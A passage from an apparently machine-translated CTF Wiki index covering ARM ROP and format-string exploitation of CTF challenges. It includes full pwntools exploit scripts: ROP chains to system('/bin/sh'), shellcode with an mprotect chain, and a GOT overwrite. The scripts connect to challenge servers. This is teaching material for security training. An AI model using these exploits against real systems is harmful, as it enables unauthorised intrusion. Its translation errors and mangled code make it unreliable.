RODATA\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n R0   0x0\n\n R1   0xfffef024 \u25c2\u2014 0x61616161 ('aaaa')\n\n R2   0x7e\n\n R3   0x0\n\nR4 0x62616162 (&amp;#39;baab&amp;#39;)\n R5   0x0\n\n R6   0x0\n\n R7   0x0\n\n R8   0x0\n\n R9   0xa5ec \u25c2\u2014 push   {r3, r4, r5, r6, r7, r8, sb, lr}\n\n R10  0xa68c \u25c2\u2014 push   {r3, r4, r5, lr}\n\nR11 0x62616163 (&amp;#39;resist&amp;#39;)\n R12  0x0\n\n SP   0xfffef098 \u25c2\u2014 0x62616165 ('eaab')\n\n PC   0x62616164 ('daab')\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\nInvalid address 0x62616164\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n00:0000\u2502 sp  0xfffef098 \u25c2\u2014 0x62616165 ('eaab')\n\n01: 0004\u2502 0xfffef09c \u25c2- 0x62616166 (&amp;#39;faab&amp;#39;)\n02: 0008\u2502 0xfffef0a0 \u25c2- 0x62616167 (&amp;#39;gaab&amp;#39;)\n03: 000c\u2502 0xfffef0a4 \u25c2\u2014 0x62616168 (&amp;#39;haab&amp;#39;)\n04:0010\u2502     0xfffef0a8 \u25c2\u2014 0x62616169 ('iaab')\n\n05: 0014\u2502 0xfffef0ac \u25c2- 0x6261616a (&amp;#39;jaab&amp;#39;)\n06:0018\u2502     0xfffef0b0 \u25c2\u2014 0x6261616b ('kaab')\n\n07: 001c\u2502 0xfffef0b4 \u25c2- 0x6261616c (&amp;#39;boom&amp;#39;)\nProgram received signal SIGSEGV\n\npwndbg&gt; cyclic -l 0x62616164\n\n112\n</code></pre></p> <p>So the padding length is 112 &gt; Or you can blast the stack overflow directly more violently</p> <p>As for the address of system, because the binary is removed from the symbol table, we can first use <code>rizzo</code> to restore part of the symbol table (for the recovery symbol table, you can see the reference link first, and will introduce it later). Although rizzo does not work well on this binary, it is fortunate that there are just a few systems in the identified functions. <pre><code>char *__fastcall system(int a1)\n\n{\n\n  char *result; // r0\n\n\n\n  if ( a1 )\n\n    result = sub_10BA8(a1);\n\n  else\n\n    result = (char *)(sub_10BA8((int)\"exit 0\") == 0);\n\n  return result;\n\n}\n</code></pre></p> <p>&gt; Or you can find the system function by searching for the /bin/sh string</p>"},{"location":"pwn/linux/arm/arm_rop/#exp","title":"exp","text":"<p>All the conditions are there, construct system(\"/bin/sh\") <pre><code>jarvisOJ_typo [master\u25cf\u25cf] cat solve.py \n\n#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom pwn import *\n\nimport sys\n\nimport pdb\n\n#  context.log_level = \"debug\"\n\n\n\n#  for i in range(100, 150)[::-1]:\n\nfor i in range(112, 123):\n\n    if sys.argv[1] == \"l\":\n\nio = process (&amp;quot;./ typo&amp;quot;, timeout = 2)\nelif sys.argv [1] == &amp;quot;d&amp;quot;:\n        io = process([\"qemu-arm\", \"-g\", \"1234\", \"./typo\"])\n\n    else:\n\n        io = remote(\"pwn2.jarvisoj.com\", 9888, timeout = 2)\n\n\n\n    io.sendafter(\"quit\\n\", \"\\n\")\n\nio.recvline ()\n\n\n    '''\n\n    jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --string /bin/sh\n\n    Strings information\n\n    ============================================================\n\n    0x0006c384 : /bin/sh\n\n    jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --only \"pop|ret\" | grep r0\n\n    0x00020904 : pop {r0, r4, pc}\n\n    '''\n\n\n\n    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)\n\n    success(i)\n\n    io.sendlineafter(\"\\n\", payload)\n\n\n\n    #  pause()\n\n    try:\n\n        #  pdb.set_trace()\n\nio.sendline (&amp;quot;echo aaaa&amp;quot;)\nio.recvuntil (&amp;quot;aaaa&amp;quot;, timeout = 1)\n    except EOFError:\n\nio.close ()\n        continue\n\n    else:\n\nio.interactive ()\n</code></pre></p>"},{"location":"pwn/linux/arm/arm_rop/#2018-shanghai-university-student-network-security-competition-baby_arm","title":"2018 Shanghai University Student Network Security Competition - baby_arm","text":""},{"location":"pwn/linux/arm/arm_rop/#static-analysis","title":"Static analysis","text":"<p>The title gave a <code>aarch64</code> schema file without open canary protection <pre><code>Shanghai2018_baby_arm [master] check ./pwn\n\n+ file ./pwn\n./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped\n\n+ checksec ./pwn\n\n[*] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn'\n\n    Arch:     aarch64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre></p> <p>Look at the program logic <pre><code>__int64 main_logic()\n\n{\n\n  Init();\n\n  write(1LL, \"Name:\", 5LL);\n\n  read(0LL, input, 512LL);\n\n  sub_4007F0();\n\n  return 0LL;\n\n}\n\n\n\nvoid sub_4007F0()\n\n{\n\n  __int64 v0; // [xsp+10h] [xbp+10h]\n\n\n\n  read(0LL, &amp;v0, 512LL);\n\n}\n</code></pre></p> <p>The trunk of the program reads 512 characters to a global variable, and in <code>sub_4007F0()</code>, it reads 512 bytes onto the stack. Note that this starts directly from <code>frame pointer + 0x10</code> Read, so it doesn't matter if you turn on canary protection.</p>"},{"location":"pwn/linux/arm/arm_rop/#ideas","title":"Ideas","text":"<p>Take a look at the idea, you can directly rop, but we do not know the remote libc version, but also found that the program has a code segment called <code>mprotect</code> <pre><code>.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!\n.text:00000000004007CC                 MOV             X29, SP\n\n.text:00000000004007D0                 MOV             W2, #0\n\n.text:00000000004007D4                 MOV             X1, #0x1000\n\n.text:00000000004007D8                 MOV             X0, #0x1000\n\n.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16\n\n.text:00000000004007E0                 BL              .mprotect\n\n.text:00000000004007E4                 NOP\n\n.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10\n\n.text: 00000000004007EC RET\n</code></pre></p> <p>But this code sets the permission bit of <code>mprotect</code> to 0, there is no executable permission, which requires us to control the permissions such as bss section by rop control <code>mprotect</code> to be writable executable.</p> <p>So you can have the following ideas:</p> <ol> <li>When you type name for the first time, write shellcode in the bss section.</li> <li>Call mprotect via rop to change the permissions of bss</li> <li>Return to the shellcode on bss</li> </ol> <p><code>mprotect</code> needs to control three parameters, you can consider using ret2csu This method can be found as follows Gadgets to control the <code>x0, x1, x2</code> registers <pre><code>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]\n\n.text:00000000004008B0                 MOV             X2, X22\n\n.text:00000000004008B4                 MOV             X1, X23\n\n.text:00000000004008B8                 MOV             W0, W24\n\n.text:00000000004008BC                 ADD             X19, X19, #1\n\n.text:00000000004008C0                 BLR             X3\n\n.text:00000000004008C4                 CMP             X19, X20\n\n.text:00000000004008C8                 B.NE            loc_4008AC\n\n.text:00000000004008CC\n\n.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C\u2191j\n\n.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]\n\n.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]\n\n.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]\n\n.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40\n\n.text: 00000000004008DC RET\n</code></pre></p> <p>The final exp is as follows: <pre><code>#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom pwn import *\n\nimport sys\n\ncontext.binary = \"./pwn\"\n\ncontext.log_level = \"debug\"\n\n\n\nif sys.argv[1] == \"l\":\n\nio = process ([ &amp;quot;QEMU-aarch64&amp;quot;, &amp;quot;-The&amp;quot;, &amp;quot;/ usr / aarch64-linux-gnu&amp;quot;, &amp;quot;./pwn&amp;quot;])\nelif sys.argv [1] == &amp;quot;d&amp;quot;:\nio = process ([ &amp;quot;QEMU-aarch64&amp;quot;, &amp;quot;G&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;-The&amp;quot;, &amp;quot;/ usr / aarch64-linux-gnu&amp;quot;, &amp;quot;./pwn&amp;quot;])\nelse:\n\nio = remote (&amp;quot;106.75.126.171&amp;quot;, 33865)\n\n\ndef csu_rop(call, x0, x1, x2):\n\n    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)\n\n    payload += flat(x2, x1, x0)\n\n    payload += '22222222'\n\n    return payload\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    elf = ELF(\"./pwn\", checksec = False)\n\n    padding = asm('mov x0, x0')\n\n\n\n    sc = asm(shellcraft.execve(\"/bin/sh\"))\n\n    #  print disasm(padding * 0x10 + sc)\n\n    io.sendafter(\"Name:\", padding * 0x10 + sc)\n\n    sleep(0.01)\n\n\n\n    #  io.send(cyclic(length = 500, n = 8))\n\n    #  rop = flat()\n\n    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))\n\n    payload += flat(0x400824)\n\n    io.send(payload)\n\n    sleep(0.01)\n\n    io.send(flat(elf.plt['mprotect']))\n\n    sleep(0.01)\n\n\n\n    raw_input(\"DEBUG: \")\n\n    io.sendafter(\"Name:\", padding * 0x10 + sc)\n\n    sleep(0.01)\n\n\n\n    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))\n\n    payload += flat(0x411068)\n\n    sleep(0.01)\n\n    io.send(payload)\n\n\n\nio.interactive ()\n</code></pre></p>"},{"location":"pwn/linux/arm/arm_rop/#notice","title":"notice","text":"<p>At the same time, it should be noted that the result of the <code>checksec</code> detection is that nx protection is turned on, but the result of this detection is not necessarily accurate, because the nx protection of the program can also be determined by the parameter <code>-nx</code> when qemu is started (such as this The problem can be nx protected by the error detection program when the remote fails. The old version of qemu may not have this parameter. <pre><code>Desktop ./qemu-aarch64 --version\n\nqemu-aarch64 version 2.7.0, Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers\n\nDesktop ./qemu-aarch64 -h| grep nx\n\n-nx           QEMU_NX           enable NX implementation\n</code></pre></p> <p>If there is an error below, there is no assembler for aarch64 <pre><code>[ERROR] Could not find 'as' installed for ContextType(arch = 'aarch64', binary = ELF('/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'), bits = 64, endian = 'little', log_level = 10)\n\n    Try installing binutils for this architecture:\n\n    https://docs.pwntools.com/en/stable/install/binutils.html\n</code></pre></p> <p>Can refer to the official documentation solution <pre><code>Shanghai2018_baby_arm [master\u25cf] apt search binutils| grep aarch64\n\np   binutils-aarch64-linux-gnu                                         - GNU binary utilities, for aarch64-linux-gnu target\n\np   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, for aarch64-linux-gnu target\n\np   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)\n\np   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)\n\nShanghai2018_baby_arm [master\u25cf] sudo apt install bintuils-aarch64-linux-gnu\n</code></pre></p> <p>&gt; aarch64 files are <code>arm64</code> when libc is installed and <code>aarch64</code> when <code>binutils</code> is installed.</p>"},{"location":"pwn/linux/arm/arm_rop/#example","title":"Example","text":"<p>Codegate2015 - looked</p>"},{"location":"pwn/linux/arm/arm_rop/#references","title":"references","text":"<p>http://www.freebuf.com/articles/terminal/134980.html</p>"},{"location":"pwn/linux/arm/environment/","title":"Environment Setup","text":"<p>\u53c2\u89c1 ctf-tools</p>"},{"location":"pwn/linux/fmtstr/fmtstr_detect/","title":"Format string vulnerability detection","text":"<p>A simple tool [LazyIDA] (https://github.com/L4ys/LazyIDA) is recommended here. Basic testing should be no problem.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/","title":"Format string vulnerability example","text":"<p>The following is a description of some of the formatting vulnerabilities in the CTF. It is also a common use of formatted strings.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#64-bit-program-format-string-vulnerability","title":"64-bit program format string vulnerability","text":""},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle","title":"Principle","text":"<p>In fact, the 64-bit offset calculation is similar to 32-bit, which is the corresponding parameter. Only the first six parameters of the 64-bit function are stored in the corresponding registers. So in the format string vulnerability? Although we did not put data into the corresponding registers, the program will still parse the format according to the format of the format string.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples","title":"Examples","text":"<p>Here, we introduce the [pwn200 GoodLuck] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection","title":"Determining protection","text":"<pre><code>\u279c  2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>It can be seen that the program has NX protection and partial RELRO protection enabled.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_1","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>It can be found that the vulnerability of the program is obvious</p> <pre><code>  for ( j = 0; j &lt;= 21; ++j )\n\n  {\n\nv5 = format [j];\n    if ( !v5 || v11[j] != v5 )\n\n    {\n\n      puts(\"You answered:\");\n\n      printf(format);\n\n      puts(\"\\nBut that was totally wrong lol get rekt\");\n\n      fflush(_bss_start);\n\n      result = 0;\n\n      goto LABEL_11;\n\n    }\n\n  }\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-the-offset","title":"Determining the offset","text":"<p>We offset the following at printf, here we only focus on the code part and the stack part.</p> <pre><code>gef\u27a4  b printf\n\nBreakpoint 1 at 0x400640\n\ngef\u27a4  r\n\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck \n\nwhat's the flag\n\n123456\n\nYou answered:\n\n\n\nBreakpoint 1, __printf (format=0x602830 \"123456\") at printf.c:28\n\n28 printf.c: There is no such file or directory.\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n\n   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8\n\n0x7ffff7a627fe &lt;fprintf+142&gt; right\n   0x7ffff7a627ff                  nop    \n\n \u2192 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8\n\n0x7ffff7a62807 &lt;printf+7&gt; test al, al\n0x7ffff7a62809 &lt;printf+9&gt; mov QWORD PTR [rsp + 0x28], rsi\n0x7ffff7a6280e &lt;printf+14&gt; mov QWORD PTR [rsp + 0x30], rdx\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n['0x7fffffffdb08', 'l8']\n\n8\n\n0x00007fffffffdb08\u2502+0x00: 0x0000000000400890  \u2192  &lt;main+234&gt; mov edi, 0x4009b8    \u2190 $rsp\n\n0x00007fffffffdb10\u2502+0x08: 0x0000000031000001\n\n0x00007fffffffdb18\u2502+0x10: 0x0000000000602830  \u2192  0x0000363534333231 (\"123456\"?)\n\n0x00007fffffffdb20\u2502 + 0x18: 0x0000000000602010 \u2192 &amp;quot;You answered: \\ ng&amp;quot;\n0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30  \u2192  \"flag{11111111111111111\"\n\n0x00007fffffffdb30\u2502+0x28: \"flag{11111111111111111\"\n\n0x00007fffffffdb38\u2502+0x30: \"11111111111111\"\n\n0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 (\"111111\"?)\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500\n\n[#0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \"123456\")\n\n[#1] 0x400890 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre> <p>It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to <code>%order$s</code> in the fmt string is the order of the arguments after the fmt string, so we only need to type <code>%9$s</code> to get the contents of the flag. Of course, we have an easier way to use fmtarg in https://github.com/scwuaptx/Pwngdb to determine the offset of a parameter.</p> <pre><code>gef\u27a4  fmtarg 0x00007fffffffdb28\n\nThe index of format argument : 10\n</code></pre> <p>Note that we have to break at printf.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-the-program","title":"Using the program","text":"<pre><code>from pwn import *\n\nfrom LibcSearcher import *\n\ngoodluck = ELF('./goodluck')\n\nif args['REMOTE']:\n\n    sh = remote('pwn.sniperoj.cn', 30017)\n\nelse:\n\n    sh = process('./goodluck')\n\npayload = \"%9$s\"\n\nprint payload\n\n##gdb.attach(sh)\n\nsh.sendline(payload)\n\nprint sh.recv()\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#hijack-got","title":"hijack GOT","text":""},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_1","title":"Principle","text":"<p>In the current C program, the functions in libc are all jumped through the GOT table. In addition, the GOT entry corresponding to each libc function can be modified without enabling RELRO protection. Therefore, we can modify the GOT table content of one libc function to the address of another libc function to achieve control of the program. For example, we can modify the contents of the got item of printf to the address of the system function. Thus, the program actually executes the system function when it executes printf.</p> <p>Suppose we override the address of function A as the address of function B, then this attack technique can be divided into the following steps.</p> <ul> <li> <p>Determine the GOT table address of function A.</p> </li> <li> <p>The function A we used in this step is usually in the program, so we can find it by simply finding the address.</p> </li> <li> <p>Determine the memory address of function B</p> </li> <li> <p>This step usually requires us to find a way to leak the address of the corresponding function B.</p> </li> <li> <p>Write the memory address of function B to the GOT table address of function A.</p> </li> <li> <p>This step generally requires us to use the vulnerability of the function to trigger. The general use methods are as follows</p> </li> <li> <p>Write function: write function.</p> </li> <li> <p>ROP</p> <pre><code>```text\n\npop eax; ret;           # printf@got -&gt; eax\n\npop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx\n\nadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset\n\n```\n</code></pre> </li> <li> <p>Format string to write at any address</p> </li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples_1","title":"Examples","text":"<p>Here we take [pwn3] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3) in the 2016 CCTF as an example.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection_1","title":"Determining protection","text":"<p>as follows</p> <pre><code>\u279c  2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 \n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_2","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function.</p> <pre><code>int get_file()\n\n{\n\n  char dest; // [sp+1Ch] [bp-FCh]@5\n\n  char s1; // [sp+E4h] [bp-34h]@1\n\n  char *i; // [sp+10Ch] [bp-Ch]@3\n\n\n\n  printf(\"enter the file name you want to get:\");\n\n  __isoc99_scanf(\"%40s\", &amp;s1);\n\n  if ( !strncmp(&amp;s1, \"flag\", 4u) )\n\n    puts(\"too young, too simple\");\n\n  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )\n\n  {\n\n    if ( !strcmp(i, &amp;s1) )\n\n    {\n\nstrcpy (&amp;amp; dest, i + 0x28);\nreturn printf (&amp;amp; dest);\n    }\n\n  }\n\nreturn printf (&amp;amp; dest);\n}\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#exploiting-ideas","title":"Exploiting ideas","text":"<p>Since there is a format string vulnerability, we can determine the following ideas</p> <ul> <li>Bypass password</li> <li>Determine formatting string parameter offset</li> <li>Use put@got to get the put function address, and then get the corresponding version of libc.so, and then get the corresponding system function address.</li> <li>Modify the contents of puts@got to the address of system.</li> <li>When the program executes the puts function again, it actually executes the system function.</li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#vulnerability-program","title":"Vulnerability Program","text":"<p>as follows</p> <pre><code>from pwn import *\n\nfrom LibcSearcher import LibcSearcher\n\n##context.log_level = 'debug'\n\npwn3 = ELF (&amp;#39;./pwn3&amp;#39;)\nif args['REMOTE']:\n\n    sh = remote('111', 111)\n\nelse:\n\n    sh = process('./pwn3')\n\n\n\n\n\ndef get(name):\n\n    sh.sendline('get')\n\n    sh.recvuntil('enter the file name you want to get:')\n\n    sh.sendline(name)\n\n    data = sh.recv()\n\n    return data\n\n\n\n\n\ndef put(name, content):\n\n    sh.sendline('put')\n\n    sh.recvuntil('please enter the name of the file you want to upload:')\n\n    sh.sendline(name)\n\n    sh.recvuntil('then, enter the content:')\n\n    sh.sendline(content)\n\n\n\n\n\ndef show_dir():\n\nsh.sendline ( &amp;#39;you&amp;#39;)\n\n\n\n\ntmp = 'sysbdmin'\n\nname = \"\"\n\nfor i in tmp:\n\n    name += chr(ord(i) - 1)\n\n\n\n\n\n## password\n\ndef password():\n\n    sh.recvuntil('Name (ftp.hacker.server:Rainism):')\n\n    sh.sendline(name)\n\n\n\n\n\n##password\n\npassword()\n\n## get the addr of puts\nputs_got = pwn3.got['puts']\n\nlog.success('puts got : ' + hex(puts_got))\n\nput('1111', '%8$s' + p32(puts_got))\n\nputs_addr = u32(get('1111')[:4])\n\n\n\n## get addr of system\n\nlibc = LibcSearcher(\"puts\", puts_addr)\n\nsystem_offset = libc.dump('system')\n\nputs_offset = libc.dump('puts')\n\nsystem_addr = puts_addr - puts_offset + system_offset\n\nlog.success('system addr : ' + hex(system_addr))\n\n\n\n## modify puts@got, point to system_addr\n\npayload = fmtstr_payload(7, {puts_got: system_addr})\n\nput('/bin/sh;', payload)\n\nsh.recvuntil('ftp&gt;')\n\nsh.sendline('get')\n\nsh.recvuntil('enter the file name you want to get:')\n\n##gdb.attach(sh)\n\nsh.sendline('/bin/sh;')\n\n\n\n## system('/bin/sh')\n\nshow_dir()\n\nsh.interactive()\n</code></pre> <p>note</p> <ul> <li>The offset I used when getting the address of the puts function is 8, because I want the first 4 bytes of my output to be the address of the puts function. In fact, the offset of the first address of the format string is 7.</li> <li>Here I used the fmtstr_payload function in pwntools to get the results we hoped for. If you are interested, you can check the official documentation. For example, here fmtstr_payload(7, {puts_got: system_addr}) means that the offset of my format string is 7, I want to write the system_addr address at the puts_got address. By default it is written in bytes.</li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#hijack-retaddr","title":"hijack retaddr","text":""},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_2","title":"Principle","text":"<p>It's easy to understand that we're going to use the format string vulnerability to hijack the return address of the program to the address we want to execute.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples_2","title":"Examples","text":"<p>Here we take [three white hat-pwnme_k0] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three white hats-pwnme_k0) as an example for analysis.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection_2","title":"Determining protection","text":"<pre><code>\u279c Three white hats - pwnme_k0 git: (master) \u2717 checksec pwnme_k0\n    Arch:     amd64-64-little\n\n    RELRO:    Full RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_3","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function.</p> <pre><code>int __usercall sub_400B07 @ &lt;eax&gt; (char format @ &lt;dil&gt; , char formata, __int64 a3, char a4)\n{\n\n  write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL);\n\nprintf (&amp;amp; formatata, &amp;quot;Welc0me to sangebaimao! \\ n&amp;quot;);\nreturn printf (&amp;amp; a4 + 4);\n}\n</code></pre> <p>The output is &amp;a4 + 4. Let\u2019s go back and find out that the password we read in is also</p> <pre><code>    